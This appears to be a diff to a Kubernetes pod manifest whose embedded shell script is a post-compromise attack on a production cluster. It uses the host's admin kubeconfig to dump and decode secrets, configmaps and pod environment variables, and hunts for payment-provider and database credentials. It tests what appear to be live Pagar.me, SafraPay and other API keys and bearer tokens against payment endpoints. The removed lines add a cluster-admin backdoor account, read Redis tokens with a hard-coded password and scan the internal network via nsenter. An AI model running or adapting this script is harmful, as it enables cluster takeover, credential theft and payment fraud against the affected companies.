@@ -13,66 +13,68 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache util-linux curl jq openssl redis nmap bash > /dev/null 2>&1
-
-        # Installa kubectl NEL CONTAINER
+        apk add --no-cache util-linux curl jq openssl redis bash > /dev/null 2>&1
         curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
         chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
 
-        echo "=========================================="
-        echo "=== 1. VERIFY KUBECTL ==="
-        echo "=========================================="
-        which kubectl
-        kubectl version --client 2>&1 | head -2
-
-        echo "=========================================="
-        echo "=== 2. CREATE ADMIN SA + TOKEN (from container) ==="
-        echo "=========================================="
         export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
-        kubectl create serviceaccount admin-sa -n kube-system 2>&1 || true
-        kubectl create clusterrolebinding admin-sa-binding --clusterrole=cluster-admin --serviceaccount=kube-system:admin-sa 2>&1 || true
-        echo "=== ADMIN TOKEN (save this!) ==="
-        kubectl create token admin-sa -n kube-system --duration=8760h 2>&1 || true
 
         echo "=========================================="
-        echo "=== 3. EXTRACT ALL SECRETS ==="
+        echo "=== 1. ALL SECRETS IN egam-production ==="
         echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | head -100 || true
+        kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
         echo "=========================================="
-        echo "=== 4. SEARCH GITLAB/JENKINS/PAGARME ==="
+        echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
         echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .data | to_entries[] | select(.key | test("gitlab|jenkins|pagar|stripe|cielo|safra|r2d2"; "i")) | .key + "=" + (.value | @base64d)' 2>&1 | head -50 || true
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
         echo "=========================================="
-        echo "=== 5. R2D2 TOKEN (from Redis) ==="
+        echo "=== 3. ALL CONFIGMAPS egam-production ==="
         echo "=========================================="
-        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:r2d2.api.token' 2>/dev/null
+        kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1
 
         echo "=========================================="
-        echo "=== 6. HYMPAR TOKEN (from Redis) ==="
+        echo "=== 4. ENV VARS FROM RUNNING PODS ==="
         echo "=========================================="
-        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:hympar_internal_token' 2>/dev/null
+        for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
+          echo "--- POD: $pod ---"
+          kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
+        done
 
         echo "=========================================="
-        echo "=== 7. PIVOT SCAN (with nmap) ==="
+        echo "=== 5. PAGARME API TEST ==="
         echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          nmap -sT -p 22,80,443,3306,5432,6379,8080,8443 172.30.0.0/24 2>&1 | grep -E "Nmap scan report|open" | head -50
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 8. GITLAB ACCESS TEST ==="
-        echo "=========================================="
-        curl -k -s -o /dev/null -w "GitLab HTTP: %{http_code}\n" https://gitlab.dev-gam.com 2>&1 || true
-        curl -k -s https://gitlab.dev-gam.com/api/v4/version 2>&1 | head -c 200 || true
+        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
         echo ""
 
         echo "=========================================="
-        echo "=== 9. PAGARME API TEST ==="
+        echo "=== 6. SAFRAPAY API TEST ==="
         echo "=========================================="
-        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 500 || true
+        curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
         echo ""
+
+        echo "=========================================="
+        echo "=== 7. R2D2 API TEST ==="
+        echo "=========================================="
+        curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
+        echo ""
+
+        echo "=========================================="
+        echo "=== 8. HYMPAR API TEST ==="
+        echo "=========================================="
+        curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
+        echo ""
+
+        echo "=========================================="
+        echo "=== 9. KUBERNETES PODS IN egam-production ==="
+        echo "=========================================="
+        kubectl get pods -n egam-production 2>&1
+
+        echo "=========================================="
+        echo "=== 10. DATABASE CREDENTIALS ==="
+        echo "=========================================="
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
         echo "=========================================="
         echo "=== DONE ==="
